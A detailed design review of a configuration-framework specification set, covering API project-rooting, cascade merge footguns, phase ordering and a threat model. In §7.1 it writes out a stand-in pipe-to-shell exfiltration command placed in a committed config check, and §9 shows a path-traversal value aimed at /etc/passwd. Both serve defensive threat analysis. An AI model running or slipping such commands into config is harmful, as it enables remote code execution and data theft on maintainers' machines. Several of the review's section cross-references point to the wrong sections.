# Specification review — response

## Method

Read in the order REVIEW.md suggested: roadmap → F1/F2/F3 → C1–C5 → R1–R4 + E1–E3 → M1/M2 + S1/S2/S3 → U1/U2/U3 + O1 → O2 (intent only). Notes taken concurrently; all 27 documents read end-to-end. The dependency graph is acyclic against roadmap order — that audit holds. Skipping prose polish, proofreading, and per-stack security-list completeness per the reviewer letter.

## TL;DR — the pushback I'd most defend

1. **The black-box Configuration API has a real ambiguity around the long-lived MCP server's project rooting.** `getModuleState` / `setModuleState` / `validateAll` are silent on which project's filesystem the call resolves against. With one MCP server long-lived across a Claude Code session, this is the single biggest gap in F2 and it isn't called out. (§2.1)
2. **`stack.override` in the user overlay is a footgun.** Default merge rule is union-with-dedup, and any non-empty value disables auto-detection (per C2). A user setting `stack.override: [my-favorite-stack]` in `~/.claude/gan/config.md` silently breaks auto-detection in every project they touch. The schema should forbid `stack.override` at the user tier, or change the merge rule. (§3.1)
3. **The "snapshot is frozen during a run" rule has no answer for mid-run user edits or multi-sprint runs.** F2 and E1 both say agents consume a frozen snapshot; neither says what happens when a user saves `.claude/gan/project.md` between sprint N and sprint N+1, nor whether the orchestrator re-snapshots. (§3.2)
4. **E3 (capability harness) cannot work as described without invoking an LLM.** "Invoke the evaluator in a controlled mode that captures output without spawning a real `/gan` run" is a one-line hand-wave for a hard problem. The evaluator is an agent prompt — without an LLM call there is no output to capture. This needs to be confronted, not deferred. (§4.1)
5. **Phase ordering claims E1 → E2 → E3 by file numbering, but E2 is gated by E3 per E2's own text.** Implementation order should be E1 → E3 → E2. Same issue with U3: its API-side bits can land in Phase 2/3, its agent-consumption bits in Phase 7. Roadmap puts the whole thing in Phase 7; spec body says otherwise. (§5)
6. **The framework-level threat model is not just a "known gap" — `evaluator.additionalChecks` makes it a near-term blocker.** A committed `.claude/gan/project.md` can declare arbitrary shell commands the evaluator runs. The moment two developers share a repo, this is RCE-on-PR-merge waiting to happen. (§7.1)
7. **There should be a fourth revision break, post-M.** Module-state semantics in F2 are barely exercised by R1 and only land for real with M1+M2. Missing checkpoint. (§5.2)

The other questions you asked (cascade honesty, runtime boundary, bite-size sizing) get specific answers below.

---

## 1. Configuration API as the right abstraction

**Verdict: yes, with two real holes.**

The black-box framing is the strongest single decision in the spec set. Pre-API, every agent had to know storage layout, file formats, schema versions, and merge logic; post-API, agents are clients. The "validateAll once at orchestrator startup, frozen snapshot to every spawned agent" discipline (F2, E1) eliminates a class of TOCTOU and per-agent-divergence bugs that would otherwise be invisible until they fired in production. The four-axis version table in F3 is exactly the cross-cutting documentation that big systems usually lack.

### 1.1 The project-rooting hole

The MCP server is "long-lived... while the host (Claude Code) is open" (F2). Module state lives at `<project>/.gan-state/modules/<name>/` (F1, M1). But none of the F2 functions — `getModuleState`, `setModuleState`, `validateAll`, `getResolvedConfig` — take a project-root parameter. So when an agent calls `setModuleState("docker", "port-registry", ...)`, what filesystem path does the server write to?

The unstated answer is presumably "the cwd of the calling client (Claude Code, in the user's project)". But:

- A long-lived MCP server's cwd is the cwd it was spawned in, which may not be the project the user is working in now (Claude Code is multi-project).
- MCP doesn't carry a per-call cwd in its protocol.
- Two `/gan` runs in two different projects against the same MCP server would resolve `setModuleState` ambiguously.

**This needs to be in F2.** Either: every function takes an explicit `projectRoot` parameter, or the MCP server is re-spawned per-project (defeats the "register once" claim in R2), or the MCP server is given a cwd-pinning handshake at session start. Pick one and write it down. The current omission is the kind of gap that R1 implementation will paper over with a judgment call, and the post-R audit may not catch unless reviewers compare R1 line-by-line against the spec.

### 1.2 List-shaped writes have a missing API surface

F2 is "bulk reads, targeted writes." But `updateStackField("android", "securitySurfaces", ...)` against a list-shaped field forces a read-modify-write pattern:

1. `getStack("android")` to retrieve the current list
2. modify in memory
3. `updateStackField()` with the full new list

Two agents doing this concurrently overwrite each other (the second's read pre-dates the first's write, but both writes succeed). The spec's safety story is "the MCP server is the sole writer; concurrent processes serialise through it" (R1) — that handles two MCP clients, but it does not handle a single agent doing two API calls without atomicity.

This is fixable two ways:
- Add `appendToStackField` / `removeFromStackField` for collections (probably what most callers want anyway).
- Or document explicitly that R-M-W is the pattern, and state that the orchestrator's serial-agent discipline makes it safe (no two agents in one run modify the same field).

The current spec asserts neither. Pick one.

### 1.3 Prose-vs-YAML preservation is underspecified

F2: "`updateStackField()` preserves any prose outside the YAML body block."
R1: `yaml-block-writer.js` "rewrites the YAML body block, preserves prose."
C1: Stack files have YAML frontmatter + one canonical YAML body block + optional `## conventions` markdown after.

What if a user has prose **above** the YAML body block but **below** the frontmatter? What about prose between two paragraphs of the same logical section? Whatever R1 does will be the de facto contract; the spec should just pin it. Suggest: "the YAML body block is replaced in place; all bytes outside the YAML body block (including frontmatter, comments, and conventions) are byte-identical before and after a successful write."

### 1.4 What's actually right about the API

Worth saying because the rest of this section is critical: the "agents read snapshot data, do not call the API mid-sprint" rule is the right discipline. The "validateAll first, abort before worktree creation, never half-state" rule is the right discipline. The "free-form prose is read-only via the API" rule is the right discipline. Don't loosen these to fix §1.1–1.3; tighten the spec.

---

## 2. Cascade model honesty

**Verdict: mostly honest, with a footgun and a doc-drift problem.**

The per-splice-point merge table (C4) plus block-level and field-level `discardInherited` (C3) is the right shape. "More-specific wins" for nested discard is correct. The acceptance criteria walk concrete scenarios. But:

### 2.1 `stack.override` in the user tier is a footgun

C4's merge rule for `stack.override`: "Union, dedup by string."
C2's interpretation: "When an overlay declares `stack.override`, it **replaces** the detection result — auto-detection is skipped... `stack.override` cannot be additive to detection."

Combining these: if a user sets `stack.override: [foo]` in `~/.claude/gan/config.md`, and a project does not set `stack.override` at all, the merged value is `[foo]` (non-empty). C2 then says auto-detection is skipped for that project. The user has silently disabled auto-detection in every project they touch.

The user's "fix" requires every project to declare `stack.discardInherited: true` plus `stack.override: []`. That's the wrong default.

**Fix one of:**
- Add `stack.override` to C3's table of fields forbidden in the user tier (alongside `additionalContext`).
- Change the merge rule so `stack.override` is project-only: a user-tier value is silently ignored when the project doesn't also set the field.
- Rephrase C2: "auto-detection is skipped only when the **project** overlay declares `stack.override`," with user-tier values treated as additive hints.

C3 already has the "project-only" mechanism for `additionalContext`; reuse it.

### 2.2 Mid-run snapshot freshness is undefined

F2: "Within a single `/gan` run, the snapshot is frozen."
E1: "If an agent's work would change configuration (rare; mostly the generator does not), the agent uses an API write function and the next agent receives an updated snapshot from the orchestrator."

This is internally consistent for **agent-driven** mutation. But:

- Sprint loops are multi-step. Between sprint N and sprint N+1, real wall-clock time passes — possibly minutes or hours.
- A user can edit `.claude/gan/project.md` in their editor mid-run and save. Their intent is "fix the threshold for the next sprint." What happens?

The spec is silent. Two reasonable answers:

**(a) Snapshot is truly frozen for the whole run.** User edits ignored until next `/gan` invocation. Defensible; preserves run-level consistency. But surprises users who assume saving a file takes effect "soon."

**(b) Orchestrator re-validates and re-snapshots between sprints.** Catches user edits. But contracts already issued in earlier sprints may be inconsistent with config changes ("we promised criterion X, now the overlay discards X"). Ambiguity grows.

This is a **real cascade-scenario hole**. Pick a behavior and write it down. (My weak vote: snapshot is frozen for the whole run; document the workaround as "abort the run with Ctrl-C and re-run after editing.")

### 2.3 Name-keyed list merge ordering is ambiguous

C4: `proposer.additionalCriteria` merges by `name`. On duplicate, "higher tier wins" — its `description` and `threshold` replace the lower tier's entry. List ordering: "lower-tier entries appear first, higher-tier entries appended after."

If a name appears in both tiers, does the merged entry sit in the lower-tier slot (its original position) or the higher-tier slot (appended)?

For most consumers this won't matter. For a contract-proposer that reads criteria in declaration order (e.g., to apply criteria sequentially with short-circuit), it could. State it explicitly: "duplicate-name entries take the higher tier's position; the lower-tier slot is removed."

### 2.4 cacheEnv conflict resolution is documented but unimplementable through the documented escape hatch

C1: when two active stacks declare `cacheEnv` for the same `envVar` with different `valueTemplate`s, "The user must resolve via an overlay (spec C3 `stack.override` or a project-tier replacement per spec C5)."

But `stack.override` doesn't change a stack's `cacheEnv` content — it changes the *active set*. And C5 project-tier stack files replace the *whole* stack file, not just `cacheEnv`. So the user's only path to fixing one envVar conflict is to copy the entire stack file into their project tier.

That is bad UX for what is almost certainly a common situation in polyglot repos (two stacks both wanting to relocate `GRADLE_USER_HOME`). Either:

- Add a splice point `stack.cacheEnvOverride` to C3 that lets a project tweak `cacheEnv` per stack without replacing the file.
- Or accept the C5 replacement path and add a cookbook section in U1 explaining "when two stacks fight over an env var, copy stack X's file to `.claude/gan/stacks/X.md` and edit only its cacheEnv."

The current spec implies a clean fix that doesn't exist.

### 2.5 Splice-point catalog is duplicated across specs

The set of splice points appears in:
- C3 (definitive table, with shape and "allowed in user overlay")
- C4 (merge rules, mostly)
- O1 (implicitly, via `mergedSplicePoints`)
- U1, U2 (UX prose)

Adding a new splice point requires touching at least three specs to stay consistent. O1 says "Any new splice point added in a future C3 revision automatically appears here with no edit required" — true for O1's JSON shape, but C4's merge-rule table is not a derived view; a new splice point with non-default merge semantics needs a row added to C4 by hand.

The author's own "single source of truth" discipline (F3 owns the cross-file invariant catalog; C2 owns dispatch; C5 owns stack resolution) implies this should be: **one catalog, in F3 or as a separate sub-section, listing splice points with shape + merge rule + default + tier-allowance.** C3 keeps the parse contract; C4 keeps the merge mechanics in narrative form, citing the catalog.

This is paid debt now or paid debt later.

---

## 3. Runtime boundary — does it hold?

**Verdict: holds at the daily-use surface; leaks at install/CI; the roadmap overclaims "never need Node."**

### 3.1 The roadmap's headline claim is not literally true

Roadmap: "Developers on non-Node ecosystems never need to install Node."
R2: "Verify Node 18+, git, and Claude Code are installed. Bail with a clear actionable error..."

Node is required to **install** the framework (`npm install -g @claudeagents/config-server`). An iOS developer needs Node once. After install, daily workflow is Swift/Xcode + `/gan` — no Node interaction.

**Honest reframing: Node is a one-time install dependency, not a daily-workflow dependency.** That's defensible and worth saying clearly. The current claim is overclaim — and a non-Node developer who hits the prereq check will rightly feel deceived by the marketing.

### 3.2 CI runners that don't have Claude Code break the installer

R2's prereq check requires Claude Code installed. R3 (`gan` CLI) explicitly says "It does not require Claude Code; it talks directly to a local invocation of the R1 server." So a CI runner could in principle install just the npm package and run `gan validate`.

But the installer fails before that point. Either:
- Add an `install.sh --no-claude-code` flag for CI use.
- Or document that CI uses `npm install -g @claudeagents/config-server` directly (not `install.sh`), and `gan validate` works against just the package.

The current spec leaves CI users to figure this out by trial.

### 3.3 Capability harness's "controlled mode" handwaves the hardest part

E3: "Loads each fixture, invokes the evaluator (in a controlled mode that captures output without spawning a real `/gan` run), normalises, diffs."

The evaluator is a **prompt** to an LLM. To capture its output without spawning a `/gan` run means one of:
- (a) Calling the LLM directly from `scripts/capability-check`, with the agent prompt and the fixture as input, capturing the output. This needs Anthropic API access in CI — a real cost line and a new prereq.
- (b) Mocking the LLM, in which case the harness tests the *prompt machinery* (config plumbing, scope filtering, criterion instantiation) but not the *agent's actual output*. Calling that "capability check" is a stretch.
- (c) Refactoring the evaluator's deterministic-data parts into a non-LLM pipeline that the harness exercises directly. This is a real refactor that E1 and E3 both gloss over.

**This is one of the most important holes in the spec set** because E3 gates E2's correctness, which gates everything Phase 5+. If E3 isn't actually running the agent, the gate is fictional.

The author should pick (a), (b), or (c) explicitly and write down the implications:

- (a) means CI needs API credentials and a budget line — disclose before Phase 3 begins.
- (b) means the harness is a regression check on plumbing, not behavior — rename the spec.
- (c) means the evaluator agent has a deterministic core that can be tested independently of the LLM — that's a real architecture decision, write it down.

### 3.4 PortValidator on Windows throws

M2: "Windows: stub that throws `PlatformNotSupported`."

This isn't a Node leakage but it is a runtime-boundary issue. The spec doesn't say what `/gan` does when an active stack pulls in a module whose prerequisites fail on the host OS. M1 says "Agents using a module catch the import error and either: Fall back to non-module behavior, or Raise a structured blocking concern." That's good but not testable — there's no fixture that exercises a Windows runner.

For pre-1.0 this is fine, but the spec should be honest: Docker module is macOS+Linux only; Windows users get `PlatformNotSupported`. Document on M2.

### 3.5 What's clearly fine

- `gan` CLI as a Node binary on PATH — daily-use is shell-only, Node is hidden behind the binary. Standard for `npm`-distributed CLIs.
- iOS developer's `xcodebuild`, `swiftlint` etc. living in S3's stack file with no Node touched at runtime. Clean.
- Module reads/writes through the API: invisible to the user. Clean.

The runtime boundary holds for the **daily** developer experience. It does not hold for **install** and it doesn't hold for **CI without Claude Code**. Calling those out honestly is a small spec edit that prevents large user disappointment.

---

## 4. Revision break checkpoints

**Verdict: three is one too few. Add post-M, and rename "post-E1" to acknowledge it includes O2's first real authoring.**

### 4.1 Missing break: post-M

Module ↔ API integration introduces real F2 surface area:
- `getModuleState` / `setModuleState` (project-rooting; see §1.1)
- `registerModule` (when does it run? per-server-start? per-project-open?)
- `pairsWith` runtime enforcement (already in R1's invariants, but only exercised by M2)
- Module project config in `.claude/gan/modules/<name>.yaml` (a third file format the cascade has to think about)

R1 implements these with no concrete module to validate against. M1+M2 are where they get exercised. **A post-M revision break (between Phase 4 and Phase 5) would catch the F2 gaps that R1's implementation papered over.**

Alternative: move M1 before E1. That puts modules in the post-E1 audit's scope. Slightly worse because M1 in Phase 3 means modules and agent-rewrites both compete for the same audit window, but it avoids adding a fourth break.

Pick one; "no break here" is the wrong answer.

### 4.2 post-E1 break understates O2

The roadmap calls revision breaks "checkpoints, not deliverable phases: no new specs are added." For F2, F3, C1–C5, S1, S2 audits, that's accurate. For O2, the post-E1 break is **functionally where O2 gets written** — the current spec is explicitly "descriptive of intent, not prescriptive of mechanism." Reconceiving the recovery flow under F1 zones and E1's snapshot model is real spec work, not editing.

The roadmap should say: "post-E1 audit + O2 first prescriptive revision." Otherwise reviewers and implementers (and you, future-you) will assume "audit" means "few-line edits" and underestimate the cost.

### 4.3 post-S audit catches S3's `${SCHEME}` placeholder gap

S3: "`SCHEME` and `DESTINATION` are placeholders resolved from the project overlay's `modules.ios.yaml` config."

C1's `buildCmd` is just a string. Nothing in C1 declares placeholder-substitution semantics. So either:
- The placeholders are literal strings, and `/gan` runs `xcodebuild -scheme ${SCHEME} ...` with the env var resolved by the shell. Workable; means `${SCHEME}` is just a normal env reference.
- C1 needs to grow a "command placeholder substitution" subsection that documents which substitutions happen and where their values come from (cacheEnv? module config? overlay?).

Post-S audit is the right place to land this. Just flag it now.

### 4.4 post-R audit risk

The post-R break audits F-phase and C-phase against R1's implementation. Implicit assumption: R1 implementation will surface gaps that human reviewers missed. True, but R1's implementer is going to make judgment calls every time the spec is ambiguous, and those calls become the de facto contract. If reviewers don't compare R1 line-by-line against the spec — including reading the implementation's decisions back into the spec — the audit becomes a rubber stamp.

This is process, not architecture. Worth flagging as a discipline.

---

## 5. Phase ordering

**Verdict: mostly correct; two real ordering bugs; one apparent ordering bug that is actually a numbering bug.**

### 5.1 E1 → E2 → E3 by number, but E3 must precede E2

E2: "Correctness of the extraction is gated by the capability test harness (E3)."
E1: "The capability test suite (E3) gates the PR."

So implementation order is **E1 → E3 → E2.** The number scheme is misleading. Rename or document explicitly:

> Implementation order within Phase 3: E1 (orchestrator + agent rewrites) → E3 (harness + bootstrap fixtures) → E2 (extract built-in stacks under the harness).

Numbering by "spec authored first" is fine; just don't let numbering imply impl order.

### 5.2 U3 ordering contradicts itself

Roadmap puts U3 in Phase 7.
U3 body: "The splice-point handling and the API-side file reading can land before E1."

Both can be true: the API-side parts ship with R1 in Phase 2, the agent-consumption parts after E1 in Phase 3+. But the roadmap doesn't say so. If the roadmap is the authoritative phase listing, then U3 lands as a single unit in Phase 7 and the body's note is wishful. If the body is right, the roadmap should split U3 into two halves (or note that U3's API-side work piggybacks on R1's sprint slices).

Pick one. My preference: keep the roadmap's Phase 7 placement honest — author U3's API-side work as an explicit sub-task in R1's sprint plan, not as a forward reference from U3.

### 5.3 M1's machinery exists in R1 (Phase 2) before M1 ships (Phase 4)

R1's repo layout includes `invariants/pairs-with.js`. F2's function surface includes `registerModule`. But M1 doesn't ship until Phase 4.

This is fine as long as R1 implements `registerModule` against a placeholder manifest schema or a stub manifest, and M1 is the first time a real manifest is registered. The dependency direction is then M1 → F2 (M1 depends on F2's surface), not R1 → M1.

But: if R1's implementation of `registerModule` makes assumptions about manifest shape (e.g., requires `stateKeys` and `configKey` exactly), then R1 implicitly depends on M1's manifest schema. Worth verifying during the post-R audit — or, simpler, write the manifest schema as part of F3 (which it already is per F3's "module-manifest-v1.json"), with M1 just providing the *content* of the spec.

### 5.4 Observability before user-facing extensibility — right call

O1 in Phase 6, U1/U2/U3 in Phase 7. U1's UX leans on `gan config print` and the resolved-config JSON shape; you can't author the UX without the surface it builds on. Good ordering.

### 5.5 R3 (CLI) before E1 — right call

`gan validate`, `gan config set` are needed by U1/U2 AND by the user during E1 implementation (debugging the rewrite). Phase 2 is the right place. Good.

---

## 6. Bite-size sizing

**Verdict: most are honest; E2 is misclassified as "medium"; F2 has a misplaced bite-size note.**

### 6.1 E2 is bigger than its bite-size note suggests

E2's responsibilities:
- Author 8 stack files (web-node, python, rust, go, ruby, kotlin, gradle, generic)
- Retire the contract-proposer's hardcoded checklist
- Coordinate with E1's per-agent rewrites
- Pass the E3 capability harness for every fixture

There's no explicit "Bite-size note" section in E2. The "Value / effort" section says "medium" effort. **This is closer to E1-class than to S1-class.** Either:
- Add a "Bite-size note" with sprint slicing (one stack per slice, with the harness acceptance gating each).
- Or merge E2 into E1's PR explicitly — they're going to be coupled anyway.

### 6.2 F2's bite-size note describes R1, not F2

F2 is contract-only — one document. Its bite-size note: "Implementation can sprint on one function group at a time: reads first, then validation, then writes." That's R1's slicing. The note is harmless but misleading. Either delete it (F2 doesn't need slicing) or move it to R1 (R1 already has it).

### 6.3 Most others are honest

- F1, F3, C1–C5, M1, M2, R1–R4, S1, S2, S3, U1, U2, U3, O1, E1, E3 — slicing is reasonable.
- O2 is large but the spec acknowledges this and gates it on a separate revision.

---

## 7. Other architecture-level concerns

### 7.1 Threat model — push back on "trust boundaries are at the OS level"

You disclosed this as a known gap and named your position: "trust boundaries are at the OS level." For a single-developer tool, that's defensible. But the moment two developers share a repo (which is the **whole point** of `.claude/gan/project.md` being committed to the repo), the OS-level boundary becomes irrelevant.

Specifically:

- `evaluator.additionalChecks` is `[{command, on_failure}]`. A committed project overlay declares arbitrary shell commands the evaluator runs.
- `auditCmd` in a project-tier stack file (C5) likewise runs arbitrary commands.
- `cacheEnv` is constrained (`envVar`, `valueTemplate` with `<worktree>` substitution) but not impossible to abuse.

**Threat scenario:** a contributor opens a PR that adds `evaluator.additionalChecks: [{command: "curl evil.example.com/exfil | sh", on_failure: silent}]` to `.claude/gan/project.md`. A maintainer runs `/gan` against the branch to review. RCE.

This is not a hypothetical — it's the standard supply-chain pattern for any tool that reads committed config and runs commands. Mitigations that should be specced:

- **Trust prompt on first run after a checkout:** when `validateAll` detects a `.claude/gan/project.md` whose content hash differs from what the user previously approved, prompt before running any field that triggers a shell command (`evaluator.additionalChecks`, `auditCmd`, `lintCmd`, etc.). Cache the approval per-branch or per-content-hash in `~/.claude/gan/trust-cache.json`.
- **Stricter splice point shapes:** `evaluator.additionalChecks` could be restricted to a registry of pre-approved check names rather than arbitrary commands. Loses flexibility; gains safety. Probably the wrong tradeoff for a power-user tool, but worth considering.
- **Read-only mode for branches that aren't the user's:** when reviewing a PR locally, `/gan --read-only` runs only API-internal validation, never project-defined commands.

You called out F4 as a possible future spec. **My pushback: F4 should land before user-facing extensibility (U1/U2), not after 1.0.** The committed-overlay model is what makes the threat real, and that model is exactly what U1 introduces to the user.

### 7.2 Telemetry / privacy disclosure

You flagged this as a pre-1.0 deferral. Agree it can defer; one note: O2's body references a "telemetry directory" and `runs/<run-id>/telemetry/`. The post-E1 O2 revision is a natural place to also pin telemetry semantics — at minimum, "what's collected, who can read it, opt-out flag." Don't ship `--recover` without the privacy story, because the recovery archive is exactly the artifact a user might not want to send anywhere.

### 7.3 No `validateAll` failure mode for `--print-config`

`/gan --print-config` runs validateAll + getResolvedConfig. If validateAll fails — what does --print-config do? Spec is silent.

Options:
- Fail-closed: print errors only, no resolved view. Symmetric with normal `/gan` behavior.
- Fail-open: print the partial resolved view + the validation errors. Useful for debugging the validation failure ("what does the cascade think this becomes?").

I'd vote fail-open for `--print-config` specifically — it's a debug surface; exiting clean defeats the purpose. But pin it.

### 7.4 `discarded` array reports "what was discarded" but not "what replaced it"

O1: `{"scope": "proposer", "byTier": "project"}`. Doesn't say whether the project then provided new criteria or left the block empty.

For debugging "why is this value missing?" the user often needs both halves. Suggest:

```json
{"scope": "proposer", "byTier": "project", "replacedWith": "empty" | "<count> entries"}
```

Minor UX gap, easy fix.

### 7.5 Cap semantics for `additionalContext` are per-splice-point

U3: 20 files / 200 KB cap **per splice point**. A project with both `planner.additionalContext` and `proposer.additionalContext` could load 400 KB. Probably fine — doc explicitly to avoid surprise.

---

## 8. Pushback on the five known gaps

You listed these as honest pre-emptive disclosures:

1. **No framework-level threat model** — pushed back hard above (§7.1). Disagree this is a 1.0 deferral.
2. **No telemetry / privacy spec** — agree on deferral; tie it to O2's revision (§7.2).
3. **F2's function signatures are not formally pinned** — agree to pin during the post-R audit per the existing plan. Add §1.1's project-rooting question to the post-R checklist.
4. **R1's resolver in prose, not pseudocode** — agree this is fine for the contract spec. Resolver pseudocode belongs in R1, and R1 already names its files (`detection.js`, `cascade.js`, `stack-resolution.js`). Sufficient.
5. **No worked end-to-end examples of complete config files** — useful for review, not strictly necessary. The `examples/project-overlay/` directory promised by U1 is partial. **One full polyglot example** (e.g., the polyglot-android-node fixture from E3, with its `.claude/gan/project.md`, expected resolved view, expected dispatch) would catch a class of cross-spec inconsistency that single-spec review can't. Worth doing once, before the post-R audit.

---

## 9. Specific cascade scenarios the rules don't cover cleanly

A few I walked through that the spec doesn't explicitly answer:

**Scenario A: project-tier stack file replaces a stack whose `pairsWith` references a module.**
Repo ships `stacks/docker.md` with `pairsWith: docker`. User drops `.claude/gan/stacks/docker.md` in their project (per C5). Does the project-tier stack still need `pairsWith: docker`? If yes, the `pairs-with.js` invariant fires on absence. If no, the project tier silently breaks pairing. C5 says "replaces wholesale," so the project-tier file is responsible for re-declaring `pairsWith`. Worth saying explicitly — that's a footgun.

**Scenario B: user overlay sets `runner.thresholdOverride: 8`. Project overlay sets `runner.discardInherited: true` plus its own `runner.additionalChecks: [...]` but no `thresholdOverride`.**
C4 acceptance criterion #3 covers exactly this: result is "agent's baked-in default threshold." Good — explicitly tested. But: the user's `additionalChecks` (if they had any in the user tier) would also be discarded. Is that intended? C4 says block-level discardInherited drops everything in that block from the upstream. If yes, document. If user wanted to keep `additionalChecks` while resetting threshold, they'd need field-level discard on `thresholdOverride` only. Spec is correct, just non-obvious.

**Scenario C: two project-tier stack files with the same name (case-sensitivity).**
What if `.claude/gan/stacks/Android.md` and `.claude/gan/stacks/android.md` both exist? Filesystem case-sensitivity differs across macOS/Linux/Windows. Not addressed. Easy fix: stack names are lowercase ASCII; lint enforces.

**Scenario D: `additionalContext` file path traversal.**
U3 reads files at validateAll. What if a project overlay declares `planner.additionalContext: ["../../../../etc/passwd"]`? Probably the API resolves paths project-relative and rejects paths that escape the project root. Not specced. Should be.

**Scenario E: `evaluator.additionalChecks` ordering.**
C4 says lists merge "lower-tier first, higher-tier appended." So additionalChecks runs in user-then-project order. The evaluator runs them after the stack's own commands (E1). If a user-tier check runs `cargo audit` and a project-tier check expects the audit run to have completed, ordering matters. Probably fine because the merge order is defined; just call out that consumers should not assume execution-order independence.

---

## 10. Dependency-graph and consistency findings

- The roadmap's dependency-graph claim ("a spec at position N never declares a dependency on a spec at position ≥ N") **holds** when checked against each spec's Dependencies section. Verified by hand.
- Several specs reference each other in body prose (especially F2 ↔ F3, C1 ↔ C2, C3 ↔ C4) without listing the reverse direction. That's not a violation of the acyclicity rule but it makes "what changes when I edit C3" harder to answer. Consider an explicit "Referenced by:" list at the bottom of each spec, generated from a single index file.
- **Splice-point catalog drift** (§2.5) is the only real consistency problem.
- **R1's repo layout** (`invariants/`, `resolution/`, etc.) implicitly establishes dependency directions that aren't in any spec's Dependencies section. Not strictly a problem; worth verifying during post-R that R1's source organisation matches the dependency graph.

---

## 11. What's clearly right

(One paragraph because you didn't ask, but the document reads better with calibration.)

The decoupling discipline, the validate-once-then-snapshot rule, the four-axis version table, the filesystem-zone-as-Linux-FS-analog model, the per-tier provenance reporting in O1, the explicit pre-1.0 framing with no backwards-compat hedging, the per-agent rewrite checklists in E1, and the capability harness's normalisation rules (modulo §3.3) are real engineering investments. The "Bite-size note" sections are honest about effort across most specs. The dependency graph is acyclic. The phase structure with three explicit revision breaks is more discipline than most pre-1.0 redesigns ship with. The instinct to push hardest on "is the Configuration API the right abstraction" in your reviewer letter is correct — that's the load-bearing decision and it does hold up.

---

## 12. Highest-leverage edits, ranked

If you make only a handful of changes before Phase 0 begins:

1. **Fix `stack.override` user-tier semantics** (§3.1). One-line schema change; prevents a recurring user footgun.
2. **Pin project-rooting in F2** (§1.1). Either explicit `projectRoot` parameter, or per-project server, or session-handshake. Without it, R1's implementer makes the call.
3. **Confront E3's "controlled mode"** (§4.1). Pick (a)/(b)/(c). The post-E1 break is too late — E3 gates E2.
4. **Add a post-M revision break, or move M1 before E1** (§5.2). Otherwise F2's module surface gets no audit.
5. **Author F4 (threat model) before U1/U2** (§7.1). Committed overlays + arbitrary commands + RCE is not a 1.0 deferral.
6. **Pin snapshot freshness across sprints** (§3.2). Frozen-for-the-whole-run is fine; just write it.
7. **Fix E2's bite-size note or merge E2 into E1's PR** (§7.1).
8. **Document Node as a one-time install dep, not "never need Node"** (§4.1).
9. **Decide U3's phase placement** (§5.2) — Phase 7 single unit, or split.
10. **Rename "post-E1 audit" to acknowledge it's also O2's first prescriptive authoring** (§4.2).

Items 1–6 are architecture; 7–10 are honesty edits to the existing prose.

---

## 13. What I'd want for a deeper second pass

If you want a follow-up review that goes deeper than this one:

- A worked end-to-end fixture (the polyglot-android-node from E3) walked through validateAll → getResolvedConfig → orchestrator startup → first sprint contract — line by line, with the resolved JSON committed alongside the fixture. This catches inter-spec inconsistency that single-spec review misses.
- The R1 resolver pseudocode for the cascade and dispatch algorithms — not because the prose is wrong, but because pseudocode forces the spec to confront ordering and edge cases the prose elides.
- One real attempt at F4 (threat model) to confirm the trust-prompt design works under the realistic "two devs share a repo" workflow, not just the "single dev" workflow.

Each is a sprint of work and bounded; none requires waiting for implementation.

— end of review
